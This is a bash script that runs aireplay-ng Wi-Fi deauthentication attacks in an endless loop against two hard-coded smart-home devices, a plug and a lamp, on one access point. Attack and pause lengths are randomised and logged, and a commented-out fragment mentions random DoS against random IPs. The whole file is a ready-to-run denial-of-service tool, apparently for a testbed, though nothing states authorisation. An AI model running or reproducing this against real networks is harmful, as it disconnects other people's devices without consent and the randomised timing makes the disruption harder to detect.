#!/bin/bash

current_time=$(date "+%Y.%m.%d-%H.%M.%S")
printf "\n$current_time *!*!*!*!*!*!*!*!* STARTING DEAUTH SCRIPT\n" 2>&1 | tee -a deauth_output/deauth_log.txt

i=0

while true
do
    i=$((i+1))

    x1="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c 50:c7:bf:66:99:2e wlan0mon 2>&1 |tee -a deauth_output/deauth.log_terminal.txt"
    x2="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c D0:73:D5:21:82:61 wlan0mon 2>&1 |tee -a deauth_output/deauth.log_terminal.txt"
    #x3="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c D0:73:D5:21:82:61 wlan0mon"

    
    x_current=""

    x1_name="plug"
    x2_name="lamp"
    #x3_name="echo"


#printf $(eval $Random_DOS$Random_IP) & script1=$!
#        printf "\n\n"
#        Random_Time=$(shuf -i30-600 -n1) #from 30 sec to 10 minutes
#        sleep $Random_Time
#        kill $script1


    start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf "\n\n * $start_current_time STARTING iteration $i : "
    rand=$(shuf -i1-2 -n1)

    if [ "$rand" = "1" ]; then
        Random_Time=$(shuf -i5-300 -n1) #from 5 sec to 5 minutes
        printf "deauth on $x1_name for $Random_Time seconds \n"
	printf $(eval $x1) & script1=$!
        printf "\n\n"
        sleep $Random_Time
        kill $script1
        x_current="$x1_name"

    elif [ "$rand" = "2" ]; then
        Random_Time=$(shuf -i5-300 -n1) #from 5 sec to 5 minutes
        printf "deauth on $x2_name for $Random_Time seconds\n"
	printf $(eval $x2) & script2=$!
        printf "\n\n"
        sleep $Random_Time
        kill $script2
        x_current="$x2_name"
 

    #elif [ "$rand" = "3" ]; then
    #    printf "$x3_name scan \n"
    #    echo $(eval $x3)
    #    x_current="$x3_name"
    #elif [ "$rand" = "4" ]; then
    #    printf "$x4_name scan \n"
    #    echo $(eval $x4)
    #    x_current="$x4_name"
    #elif [ "$rand" = "5" ]; then
    #    printf "$x5_name scan \n"
    #    echo $(eval $x5)
    #    x_current="$x5_name"
    #elif [ "$rand" = "6" ]; then
    #    printf "$x6_name scan \n"
    #    echo $(eval $x6)
    #    x_current="$x6_name"
    #elif [ "$rand" = "7" ]; then
    #    printf "$x7_name scan \n"
    #    echo $(eval $x7)
    #    x_current="$x7_name"
    #elif [ "$rand" = "8" ]; then
    #    printf "$x8_name scan \n"
    #    echo $(eval $x8)
    #    x_current="$x8_name"
    #elif [ "$rand" = "9" ]; then
    #    printf "$x9_name scan \n"
    #    echo $(eval $x9)
    #    x_current="$x9_name"
    #elif [ "$rand" = "10" ]; then
    #    printf "$x10_name scan \n"
    #    echo $(eval $x10)
    #    x_current="$x10_name"
    #elif [ "$rand" = "11" ]; then
    #    printf "$x11_name scan \n"
    #    echo $(eval $x11)
    #    x_current="$x11_name"
    else
        echo "error"
    fi


    printf "$i) Deauth on a $x_current start: $start_current_time, finish: $stop_current_time\n" 2>&1 | tee -a deauth_output/deauth_log.txt

    Random_Sleep=$(shuf -i5-200 -n1) #from 5 sec to 5 minutes
    printf "\n\nsleeping for $Random_Sleep seconds\n" 2>&1 | tee -a deauth_output/deauth_log.txt
    sleep $Random_Sleep

    stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")

    

done



